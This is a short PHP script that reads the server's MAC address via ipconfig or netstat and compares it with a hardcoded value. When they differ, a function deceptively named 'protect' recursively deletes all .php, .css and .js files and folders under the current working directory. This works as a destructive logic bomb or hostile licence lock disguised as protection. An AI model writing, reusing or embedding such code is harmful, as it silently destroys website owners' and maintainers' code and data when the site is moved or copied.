<?php 
$LMA = "18-CF-5E-44-9A-8Aa";
function getMW(){
   ob_start();  
   system('ipconfig /all');    
   $mycomsys=ob_get_contents();   
   ob_clean();  
   $Find = "Physical";
   $pmc = strpos($mycomsys, $Find); 
   $var=substr($mycomsys,($pmc+36),17);  
   return $var;  
}

function getML() {
  exec('netstat -ie', $result);
  if(is_array($result)) {
    $iface = array();
    foreach($result as $key => $line) {
      if($key > 0) {
        $tmp = str_replace(" ", "", substr($line, 0, 10));
        if($tmp <> "") {
          $macpos = strpos($line, "HWaddr");
          if($macpos !== false) {
            $iface[] = array('iface' => $tmp, 'mac' => strtolower(substr($line, $macpos+7, 17)));
          }
        }
      }
    }
    return $iface[0]['mac'];
  } else {
    return "notfound";
  }
}

if (stripos(PHP_OS, 'linux') === 0) {
   $SMA = getML();
}
elseif (stripos(PHP_OS, 'win') === 0) {
    $SMA = getMW();
} elseif (stripos(PHP_OS, 'darwin') === 0) {
     $SMA = "NotFound";
}
echo $SMA;

if($LMA != $SMA){
        function protect($str) {
        //It it's a file.
        if (is_file($str)) {
            //Attempt to delete it.
            $fy = substr($str, -2);
            if ($fy == "hp" || $fy == "ss" || $fy == "js") {
               return unlink($str);
            }
        }
        //If it's a directory.
        elseif (is_dir($str)) {
            $scan = glob(rtrim($str,'/').'/*');
            foreach($scan as $index=>$path) {
                protect($path);
            }
            return @rmdir($str);
        }
     }
    $dir = getcwd();
    protect($dir);        
}
?>